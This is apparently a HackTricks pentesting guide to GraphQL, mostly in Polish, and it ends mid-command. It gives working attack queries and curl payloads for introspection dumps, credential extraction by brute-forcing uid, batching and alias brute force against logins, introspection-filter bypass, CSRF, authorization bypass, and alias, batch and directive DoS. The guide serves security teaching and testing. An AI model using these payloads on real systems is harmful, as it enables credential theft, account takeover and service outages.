# GraphQL

{{#include ../../banners/hacktricks-training.md}}

## Introduction

GraphQL jest przedstawiany jako **wydajna alternatywa** dla REST API, oferująca uproszczone podejście do pobierania danych z backendu. W przeciwieństwie do REST, który często wymaga wielu żądań do różnych endpointów, aby zebrać potrzebne dane, GraphQL pozwala pobrać wszystkie wymagane informacje przy użyciu **jednego żądania**. To usprawnienie znacząco **ułatwia pracę deweloperom**, zmniejszając złożoność procesów pobierania danych.

## GraphQL and Security

Wraz z pojawieniem się nowych technologii, w tym GraphQL, pojawiają się także nowe luki bezpieczeństwa. Kluczowe jest to, że **GraphQL nie zawiera domyślnie mechanizmów uwierzytelniania**. To obowiązek deweloperów, by zaimplementować takie zabezpieczenia. Bez odpowiedniego uwierzytelnienia endpointy GraphQL mogą ujawniać wrażliwe informacje nieuwierzytelnionym użytkownikom, stwarzając poważne ryzyko bezpieczeństwa.

### Directory Brute Force Attacks and GraphQL

Aby zidentyfikować wystawione instancje GraphQL, zaleca się uwzględnienie w atakach brute force na katalogi następujących ścieżek. Te ścieżki to:

- `/graphql`
- `/graphiql`
- `/graphql.php`
- `/graphql/console`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

Zidentyfikowanie otwartych instancji GraphQL pozwala na sprawdzenie obsługiwanych zapytań. Jest to kluczowe dla zrozumienia danych dostępnych przez endpoint. System introspekcji GraphQL ułatwia to, opisując zapytania, które obsługuje schemat. Po więcej informacji odnieś się do dokumentacji GraphQL dotyczącej introspekcji: [**GraphQL: A query language for APIs.**](https://graphql.org/learn/introspection/)

### Fingerprint

Narzędzie [**graphw00f**](https://github.com/dolevf/graphw00f) potrafi wykryć, który silnik GraphQL jest używany na serwerze, a następnie wyświetla przydatne informacje dla audytora bezpieczeństwa.

#### Uniwersalne zapytania <a href="#universal-queries" id="universal-queries"></a>

Aby sprawdzić, czy URL to serwis GraphQL, można wysłać **uniwersalne zapytanie** `query{__typename}`. Jeśli odpowiedź zawiera `{"data": {"__typename": "Query"}}`, potwierdza to, że URL obsługuje endpoint GraphQL. Ta metoda opiera się na polu `__typename` GraphQL, które ujawnia typ zapytanego obiektu.
```javascript
query{__typename}
```
### Podstawowa enumeracja

Graphql zazwyczaj obsługuje **GET**, **POST** (x-www-form-urlencoded) oraz **POST**(json). Jednak ze względów bezpieczeństwa zaleca się zezwalać tylko na json, aby zapobiec atakom CSRF.

#### Introspekcja

Aby użyć introspekcji do odkrywania informacji o schemacie, wykonaj zapytanie pola `__schema`. To pole jest dostępne na głównym typie wszystkich zapytań.
```bash
query={__schema{types{name,fields{name}}}}
```
Za pomocą tego query znajdziesz nazwy wszystkich typów, które są używane:

![](<../../images/image (1036).png>)
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
Za pomocą tego zapytania możesz wyodrębnić wszystkie typy, ich pola oraz ich argumenty (i typ argumentów). To będzie bardzo przydatne, aby wiedzieć, jak wykonywać zapytania do bazy danych.

![](<../../images/image (950).png>)

**Błędy**

Warto wiedzieć, czy **błędy** będą **wyświetlane**, ponieważ dostarczą przydatnych **informacji**.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
![](<../../images/image (416).png>)

**Wypisz schemat bazy danych za pomocą introspekcji**

> [!TIP]
> Jeśli introspekcja jest włączona, ale powyższe zapytanie nie działa, spróbuj usunąć dyrektywy `onOperation`, `onFragment` oraz `onField` ze struktury zapytania.
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Wbudowane zapytanie introspekcyjne:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
The last code line is a graphql query that will dump all the meta-information from the graphql (objects names, parameters, types...)

![](<../../images/image (363).png>)

If introspection is enabled you can use [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) to view in a GUI all the options.

### Zapytania

Skoro wiemy już, jakie informacje są przechowywane w bazie danych, spróbujmy **wyciągnąć kilka wartości**.

W introspekcji możesz znaleźć **który obiekt możesz bezpośrednio zapytać** (ponieważ nie możesz zapytać obiektu tylko dlatego, że on istnieje). Na poniższym obrazku widać, że "_queryType_" nazywa się "_Query_" i że jednym z pól obiektu "_Query_" jest "_flags_", który jest również typem obiektu. Dlatego możesz wykonać zapytanie do obiektu "_flags_".

![](<../../images/Screenshot from 2021-03-13 18-17-48.png>)

Zauważ, że typ pola zapytania "_flags_" to "_Flags_", a ten obiekt jest zdefiniowany jak poniżej:

![](<../../images/Screenshot from 2021-03-13 18-22-57 (1).png>)

Widać, że obiekty "_Flags_" składają się z pól **name** i **value**. Możesz więc pobrać wszystkie wartości pól **name** i **value** dla flag za pomocą zapytania:
```javascript
query={flags{name, value}}
```
Zauważ, że jeśli **obiekt do zapytania** jest **prymitywnym** **typem** takim jak **string** jak w poniższym przykładzie

![](<../../images/image (958).png>)

Możesz po prostu zapytać go za pomocą:
```javascript
query = { hiddenFlags }
```
W innym przykładzie, gdzie wewnątrz obiektu typu "_Query_" były 2 obiekty: "_user_" i "_users_".\
Jeśli te obiekty nie wymagają żadnego argumentu do wyszukiwania, można **pobrać wszystkie informacje z nich** po prostu **żądać** danych, których potrzebujesz. W tym przykładzie z Internetu można było wyciągnąć zapisane nazwy użytkowników i hasła:

![](<../../images/image (880).png>)

Jednak w tym przykładzie, jeśli spróbujesz to zrobić, otrzymasz ten **błąd**:

![](<../../images/image (1042).png>)

Wygląda na to, że w jakiś sposób będzie wyszukiwać używając argumentu "_**uid**_" typu _**Int**_.\
Tak czy inaczej, już o tym wiedzieliśmy — w sekcji [Basic Enumeration](graphql.md#basic-enumeration) zaproponowano zapytanie, które pokazywało wszystkie potrzebne informacje: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Jeśli spojrzysz na załączony obrazek, gdy uruchomiłem to zapytanie, zobaczysz, że "_**user**_" miał **arg** "_**uid**_" typu _Int_.

Więc wykonując lekkie _**uid**_ bruteforce, odkryłem że dla _**uid**=**1**_ zwrócono nazwę użytkownika i hasło:\
`query={user(uid:1){user,password}}`

![](<../../images/image (90).png>)

Zauważ, że **odkryłem**, iż mogłem żądać **parametrów** "_**user**_" i "_**password**_" ponieważ jeśli spróbuję szukać czegoś, co nie istnieje (`query={user(uid:1){noExists}}`) otrzymuję ten błąd:

![](<../../images/image (707).png>)

A podczas fazy **enumeration phase** odkryłem, że obiekt "_**dbuser**_" miał pola "_**user**_" i "_**password**_.

**Query string dump trick (thanks to @BinaryShadow\_)**

Jeśli możesz wyszukiwać po typie string, np.: `query={theusers(description: ""){username,password}}` i **wyszukasz pusty string**, to to **zrzuci wszystkie dane**. (_Uwaga: ten przykład nie jest związany z przykładem z tutoriala; w tym przykładzie załóż, że możesz wyszukiwać używając "**theusers**" po polu String o nazwie "**description**"_).

### Wyszukiwanie

W tej konfiguracji **database** zawiera **persons** i **movies**. **Persons** są identyfikowane przez ich **email** i **name**; **movies** przez ich **name** i **rating**. **Persons** mogą być przyjaciółmi między sobą i także mieć movies, co wskazuje relacje w bazie danych.

Możesz **wyszukać** persons **po** **name** i uzyskać ich adresy email:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Możesz **wyszukać** osoby **po** **nazwie** i uzyskać ich **subskrybowane** **filmy**:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Zwróć uwagę, jak wskazano pobranie `name` z `subscribedMovies` danej osoby.

Możesz także **przeszukać kilka obiektów jednocześnie**. W tym przypadku przeprowadzono wyszukiwanie dwóch filmów:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
A nawet **relacje kilku różnych obiektów przy użyciu aliasów**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutacje

**Mutacje służą do wprowadzania zmian po stronie serwera.**

W **introspekcji** możesz znaleźć **zadeklarowane** **mutacje**. Na poniższym obrazku "_MutationType_" nazywa się "_Mutation_", a obiekt "_Mutation_" zawiera nazwy mutacji (np. "_addPerson_" w tym przypadku):

![](<../../images/Screenshot from 2021-03-13 18-26-27 (1).png>)

W tej konfiguracji **baza danych** zawiera **osoby** i **filmy**. **Osoby** są identyfikowane przez swój **email** i **name**; **filmy** przez swoją **name** i **rating**. **Osoby** mogą być ze sobą zaprzyjaźnione i również mieć filmy, co wskazuje relacje w bazie danych.

Mutacja do **tworzenia nowych** filmów w bazie danych może wyglądać następująco (w tym przykładzie mutacja nazywa się `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Zwróć uwagę, że zarówno wartości, jak i typ danych są wskazane w zapytaniu.**

Dodatkowo baza danych obsługuje operację **mutation**, nazwaną `addPerson`, która umożliwia tworzenie **persons** wraz z ich powiązaniami z istniejącymi **friends** i **movies**. Należy pamiętać, że **friends** i **movies** muszą istnieć w bazie danych wcześniej, zanim zostaną powiązane z nowo utworzoną osobą.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Directive Overloading

Jak wyjaśniono w [**one of the vulns described in this report**](https://www.landh.tech/blog/20240304-google-hack-50000/), directive overloading polega na wywoływaniu dyrektywy nawet miliony razy, aby zmusić serwer do marnowania zasobów operacyjnych, aż możliwe będzie przeprowadzenie DoS.

### Batching brute-force in 1 API request

This information was take from [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Uwierzytelnianie przez GraphQL API polegające na **wysyłaniu jednocześnie wielu zapytań z różnymi danymi uwierzytelniającymi** w celu jego sprawdzenia. To klasyczny brute force attack, jednak teraz możliwe jest wysłanie więcej niż jednej pary login/password w jednym żądaniu HTTP dzięki funkcji GraphQL batching. Takie podejście może zmylić zewnętrzne aplikacje monitorujące rate limiting, sugerując, że wszystko jest w porządku i że nie ma bota brute-forcing próbującego odgadnąć passwords.

Below you can find the simplest demonstration of an application authentication request, with **3 different email/passwords pairs at a time**. Obviously it’s possible to send thousands in a single request in the same way:

![](<../../images/image (1081).png>)

As we can see from the response screenshot, the first and the third requests returned _null_ and reflected the corresponding information in the _error_ section. The **second mutation had the correct authentication** data and the response has the correct authentication session token.

![](<../../images/image (119) (1).png>)

## GraphQL Without Introspection

More and more **graphql endpoints are disabling introspection**. However, the errors that graphql throws when an unexpected request is received are enough for tools like [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) to recreate most part of the schema.

Moreover, the Burp Suite extension [**GraphQuail**](https://github.com/forcesunseen/graphquail) extension **observes GraphQL API requests going through Burp** and **builds** an internal GraphQL **schema** with each new query it sees. It can also expose the schema for GraphiQL and Voyager. The extension returns a fake response when it receives an introspection query. As a result, GraphQuail shows all queries, arguments, and fields available for use within the API. For more info [**check this**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

A nice **wordlist** to discover [**GraphQL entities can be found here**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Bypassing GraphQL introspection defences <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

To bypass restrictions on introspection queries in APIs, inserting a **special character after the `__schema` keyword** proves effective. This method exploits common developer oversights in regex patterns that aim to block introspection by focusing on the `__schema` keyword. By adding characters like **spaces, new lines, and commas**, which GraphQL ignores but might not be accounted for in regex, restrictions can be circumvented. For instance, an introspection query with a newline after `__schema` may bypass such defenses:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Jeśli to się nie uda, rozważ alternatywne metody wysyłania żądań, takie jak **GET requests** lub **POST with `x-www-form-urlencoded`**, ponieważ ograniczenia mogą dotyczyć tylko żądań POST.

### Spróbuj WebSockets

Jak wspomniano w [**this talk**](https://www.youtube.com/watch?v=tIo_t5uUK50), sprawdź, czy możliwe jest połączenie z graphQL przez WebSockets, ponieważ może to pozwolić na obejście potencjalnego WAF i spowodować, że komunikacja WebSocket leak the schema of the graphQL:
```javascript
ws = new WebSocket("wss://target/graphql", "graphql-ws")
ws.onopen = function start(event) {
var GQL_CALL = {
extensions: {},
query: `
{
__schema {
_types {
name
}
}
}`,
}

var graphqlMsg = {
type: "GQL.START",
id: "1",
payload: GQL_CALL,
}
ws.send(JSON.stringify(graphqlMsg))
}
```
### **Odkrywanie ujawnionych struktur GraphQL**

Gdy introspekcja jest wyłączona, przejrzenie kodu źródłowego strony w poszukiwaniu preloaded queries w bibliotekach JavaScript jest przydatną strategią. Te zapytania można znaleźć, używając zakładki `Sources` w narzędziach deweloperskich, co daje wgląd w schemat API i ujawnia potencjalnie **ujawnione wrażliwe zapytania**. Polecenia do przeszukiwania w narzędziach deweloperskich to:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
### Error-based schema reconstruction & engine fingerprinting (InQL v6.1+)

Gdy introspekcja jest zablokowana, **InQL v6.1+** potrafi teraz odtworzyć osiągalny schemat wyłącznie na podstawie informacji zwrotnych z błędów. Nowy *schema bruteforcer* grupuje kandydackie nazwy pól/argumentów z konfigurowalnej listy słów i wysyła je w operacjach obejmujących wiele pól, aby zmniejszyć ruch HTTP. Przydatne wzorce błędów są następnie zbierane automatycznie:

- `Field 'bugs' not found on type 'inql'` potwierdza istnienie typu nadrzędnego, jednocześnie odrzucając niepoprawne nazwy pól.
- `Argument 'contribution' is required` pokazuje, że argument jest obowiązkowy i ujawnia jego pisownię.
- Sugestie, takie jak `Did you mean 'openPR'?`, są dodawane z powrotem do kolejki jako zweryfikowani kandydaci.
- Przez celowe wysyłanie wartości o nieodpowiednim typie prymitywnym (np. integers zamiast strings) bruteforcer wywołuje błędy type mismatch, które leak the real type signature, w tym opakowań list/obiektów takich jak `[Episode!]`.

Bruteforcer kontynuuje rekurencję przez każdy typ, który ujawnia nowe pola, więc wordlista łącząca ogólne nazwy GraphQL z przypuszczeniami specyficznymi dla aplikacji w końcu odwzoruje duże fragmenty schematu bez introspekcji. Czas działania jest w dużej mierze ograniczony przez rate limiting i liczbę kandydatów, dlatego dopracowanie ustawień InQL (wordlist, batch size, throttling, retries) jest kluczowe dla bardziej skrytych testów.

W tej samej wersji InQL dostarcza **GraphQL engine fingerprinter** (pożyczając sygnatury z narzędzi takich jak `graphw00f`). Moduł wysyła celowo nieprawidłowe dyrektywy/zapytania i klasyfikuje backend poprzez dopasowanie dokładnego tekstu błędu. Na przykład:
```graphql
query @deprecated {
__typename
}
```
- Apollo odpowiada: `Directive "@deprecated" may not be used on QUERY.`
- GraphQL Ruby odpowiada: `'@deprecated' can't be applied to queries`.

Gdy silnik zostanie rozpoznany, InQL wyświetla odpowiadający wpis z [GraphQL Threat Matrix](https://github.com/nicholasaleks/graphql-threat-matrix), pomagając testerom priorytetyzować słabości typowe dla tej rodziny serwerów (domyślne zachowanie introspekcji, limity głębokości, luki CSRF, przesyłanie plików itp.).

Wreszcie, **automatic variable generation** usuwa klasyczną przeszkodę przy przejściu do Burp Repeater/Intruder. Za każdym razem, gdy operacja wymaga variables JSON, InQL teraz wstrzykuje rozsądne wartości domyślne, dzięki czemu żądanie przechodzi walidację schematu przy pierwszym wysłaniu:
```text
"String"  -> "exampleString"
"Int"     -> 42
"Float"   -> 3.14
"Boolean" -> true
"ID"      -> "123"
ENUM      -> first declared value
```
Zagnieżdżone input objects dziedziczą to samo mapowanie, więc od razu otrzymujesz składniowo i semantycznie poprawny payload, który można fuzzować pod kątem SQLi/NoSQLi/SSRF/logic bypasses bez ręcznego reverse-engineeringu każdego argumentu.

## CSRF w GraphQL

Jeśli nie wiesz, czym jest CSRF, przeczytaj następującą stronę:


{{#ref}}
../../pentesting-web/csrf-cross-site-request-forgery.md
{{#endref}}

W praktyce można znaleźć wiele endpointów GraphQL **skonfigurowanych bez CSRF tokens.**

Zauważ, że zapytania GraphQL są zwykle wysyłane jako żądania POST z nagłówkiem Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Jednak większość GraphQL endpoints obsługuje także **`form-urlencoded` POST requests:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Dlatego, ponieważ żądania CSRF podobne do poprzednich są wysyłane **without preflight requests**, możliwe jest **perform** **changes** w GraphQL poprzez wykorzystanie CSRF.

Zauważ jednak, że nowa domyślna wartość cookie flagi `samesite` w Chrome to `Lax`. Oznacza to, że cookie będzie wysyłane z serwisu trzeciej strony tylko w żądaniach GET.

Zauważ, że zwykle możliwe jest również wysłanie **query** **request** jako **GET** **request** i token CSRF może nie być weryfikowany w żądaniu GET.

Również nadużycie [**XS-Search**](../../pentesting-web/xs-search/index.html) **attack** może umożliwić eksfiltrację zawartości z endpointu GraphQL, wykorzystując poświadczenia użytkownika.

Po więcej informacji sprawdź [**original post here**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Cross-site WebSocket hijacking in GraphQL

Podobnie do podatności CRSF wykorzystujących GraphQL, możliwe jest również przeprowadzenie **Cross-site WebSocket hijacking to abuse an authentication with GraphQL with unprotected cookies** i zmuszenie użytkownika do wykonania nieoczekiwanych akcji w GraphQL.

Dla więcej informacji sprawdź:


{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}

## Autoryzacja w GraphQL

Wiele funkcji GraphQL zdefiniowanych na endpointzie może sprawdzać tylko uwierzytelnienie żądającego, a nie autoryzację.

Modyfikacja zmiennych wejściowych query może doprowadzić do ujawnienia wrażliwych danych konta [leaked](https://hackerone.com/reports/792927).

Mutation może nawet prowadzić do przejęcia konta poprzez próbę modyfikacji danych innego konta.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Omijanie autoryzacji w GraphQL

[Chaining queries](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) w połączeniu mogą obejść słaby system uwierzytelniania.

W poniższym przykładzie widać, że operacja to "forgotPassword" i powinna wykonać tylko zapytanie forgotPassword z nią związane. Można to obejść, dodając na końcu kolejne zapytanie — w tym przypadku dodajemy "register" oraz zmienną user, żeby system zarejestrował nowego użytkownika.

<figure><img src="../../images/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Omijanie Rate Limits przy użyciu aliases w GraphQL

W GraphQL aliases to potężna funkcja, która pozwala na **jawne nadawanie nazw właściwościom** podczas wysyłania żądania API. Ta możliwość jest szczególnie przydatna do pobierania **wielu instancji tego samego typu** obiektu w ramach jednego żądania. Aliases można wykorzystać, aby obejść ograniczenie uniemożliwiające obiektom GraphQL posiadanie wielu właściwości o tej samej nazwie.

Dla szczegółowego zrozumienia aliases w GraphQL, polecanym źródłem jest: [Aliases](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Choć głównym celem aliases jest ograniczenie liczby wywołań API, zidentyfikowano niezamierzone zastosowanie, w którym aliases można wykorzystać do przeprowadzenia brute force attacks na endpoint GraphQL. Dzieje się tak, ponieważ niektóre endpointy są chronione przez rate limiters zaprojektowane, aby powstrzymać brute force attacks poprzez ograniczanie **number of HTTP requests**. Jednak takie rate limiters mogą nie uwzględniać liczby operacji zawartych w pojedynczym żądaniu. Ponieważ aliases pozwalają umieścić wiele zapytań w jednym HTTP request, mogą ominąć tego typu ograniczenia.

Rozważ poniższy przykład, który ilustruje, jak aliased queries można użyć do weryfikacji poprawności kodów rabatowych sklepu. Ta metoda może obejść rate limiting, ponieważ łączy wiele zapytań w jedno HTTP request, potencjalnie pozwalając na jednoczesną weryfikację wielu kodów rabatowych.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## DoS w GraphQL

### Alias Overloading

**Alias Overloading** to luka w GraphQL, w której atakujący przeciążają zapytanie wieloma aliasami tego samego pola, powodując, że backendowy resolver wykonuje to pole wielokrotnie. Może to przeciążyć zasoby serwera, prowadząc do **Denial of Service (DoS)**. Na przykład, w zapytaniu poniżej to samo pole (`expensiveField`) jest żądane 1,000 razy przy użyciu aliasów, zmuszając backend do obliczenia go 1,000 razy, co może wyczerpać CPU lub pamięć:
```graphql
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "Content-Type: application/json" \
-d '{"query": "{ alias0:__typename \nalias1:__typename \nalias2:__typename \nalias3:__typename \nalias4:__typename \nalias5:__typename \nalias6:__typename \nalias7:__typename \nalias8:__typename \nalias9:__typename \nalias10:__typename \nalias11:__typename \nalias12:__typename \nalias13:__typename \nalias14:__typename \nalias15:__typename \nalias16:__typename \nalias17:__typename \nalias18:__typename \nalias19:__typename \nalias20:__typename \nalias21:__typename \nalias22:__typename \nalias23:__typename \nalias24:__typename \nalias25:__typename \nalias26:__typename \nalias27:__typename \nalias28:__typename \nalias29:__typename \nalias30:__typename \nalias31:__typename \nalias32:__typename \nalias33:__typename \nalias34:__typename \nalias35:__typename \nalias36:__typename \nalias37:__typename \nalias38:__typename \nalias39:__typename \nalias40:__typename \nalias41:__typename \nalias42:__typename \nalias43:__typename \nalias44:__typename \nalias45:__typename \nalias46:__typename \nalias47:__typename \nalias48:__typename \nalias49:__typename \nalias50:__typename \nalias51:__typename \nalias52:__typename \nalias53:__typename \nalias54:__typename \nalias55:__typename \nalias56:__typename \nalias57:__typename \nalias58:__typename \nalias59:__typename \nalias60:__typename \nalias61:__typename \nalias62:__typename \nalias63:__typename \nalias64:__typename \nalias65:__typename \nalias66:__typename \nalias67:__typename \nalias68:__typename \nalias69:__typename \nalias70:__typename \nalias71:__typename \nalias72:__typename \nalias73:__typename \nalias74:__typename \nalias75:__typename \nalias76:__typename \nalias77:__typename \nalias78:__typename \nalias79:__typename \nalias80:__typename \nalias81:__typename \nalias82:__typename \nalias83:__typename \nalias84:__typename \nalias85:__typename \nalias86:__typename \nalias87:__typename \nalias88:__typename \nalias89:__typename \nalias90:__typename \nalias91:__typename \nalias92:__typename \nalias93:__typename \nalias94:__typename \nalias95:__typename \nalias96:__typename \nalias97:__typename \nalias98:__typename \nalias99:__typename \nalias100:__typename \n }"}' \
'https://example.com/graphql'
```
Aby temu zapobiec, zaimplementuj alias count limits, query complexity analysis lub rate limiting, aby zapobiec nadużyciom zasobów.

### **Array-based Query Batching**

**Array-based Query Batching** to luka, w której GraphQL API pozwala na grupowanie wielu zapytań w jednym żądaniu, umożliwiając atakującemu wysłanie dużej liczby zapytań jednocześnie. Może to przeciążyć backend poprzez równoczesne wykonywanie wszystkich zapytań z partii, zużywając nadmierne zasoby (CPU, pamięć, połączenia z bazą danych) i potencjalnie prowadząc do **Denial of Service (DoS)**. Jeśli nie istnieje ograniczenie liczby zapytań w partii, atakujący może to wykorzystać do obniżenia dostępności usługi.
```graphql
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '[{"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}, {"query": "query cop { __typename }"}]' \
'https://example.com/graphql'
```
W tym przykładzie 10 różnych zapytań jest zgrupowanych w jedno żądanie, zmuszając serwer do wykonania ich wszystkich jednocześnie. Jeśli zostanie to wykorzystane z większym rozmiarem partii zapytań lub zapytaniami wymagającymi dużych zasobów obliczeniowych, może przeciążyć serwer.

### **Directive Overloading Vulnerability**

**Directive Overloading** występuje, gdy serwer GraphQL pozwala na zapytania z nadmiernymi, zduplikowanymi dyrektywami. Może to przeciążyć parser i executor serwera, szczególnie jeśli serwer wielokrotnie przetwarza tę samą logikę dyrektywy. Bez odpowiedniej walidacji lub ograniczeń atakujący może to wykorzystać, tworząc zapytanie z licznymi zduplikowanymi dyrektywami, co wywoła wysokie zużycie zasobów obliczeniowych lub pamięci, prowadząc do Denial of Service (DoS).
```bash
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @aa@aa@aa@aa@aa@aa@aa@aa@aa@aa }", "operationName": "cop"}' \
'https://example.com/graphql'
```
Zwróć uwagę, że w poprzednim przykładzie `@aa` jest niestandardową dyrektywą, która **może nie być zadeklarowana**. Powszechnie spotykaną dyrektywą jest **`@include`**:
```bash
curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "query cop { __typename @include(if: true) @include(if: true) @include(if: true) @include(if: true) @include(if: true) }", "operationName": "cop"}' \
'https://example.com/graphql'
```
Możesz także wysłać zapytanie introspekcyjne, aby odkryć wszystkie zadeklarowane dyrektywy:
```bash
curl -X POST \
-H "Content-Type: application/json" \
-d '{"query": "{ __schema { directives { name locations args { name type { name kind ofType { name } } } } } }"}' \
'https://example.com/graphql'
```
A potem **użyj niektórych niestandardowych**.

### **Field Duplication Vulnerability**

**Field Duplication** to luka, w której serwer GraphQL pozwala na zapytania z tym samym polem powtarzanym nadmiernie. Zmusza to serwer do ponownego rozwiązywania pola dla każdej instancji, zużywając znaczące zasoby (CPU, pamięć oraz wywołania bazy danych). Atakujący może skonstruować zapytania z setkami lub tysiącami powtórzonych pól, powodując duże obciążenie i potencjalnie prowadząc do **Denial of Service (DoS)**.
```bash
# Test provided by https://github.com/dolevf/graphql-cop
curl -X POST -H "User-Agent: graphql-cop/1.13" -H "Content-Type: application/json" \
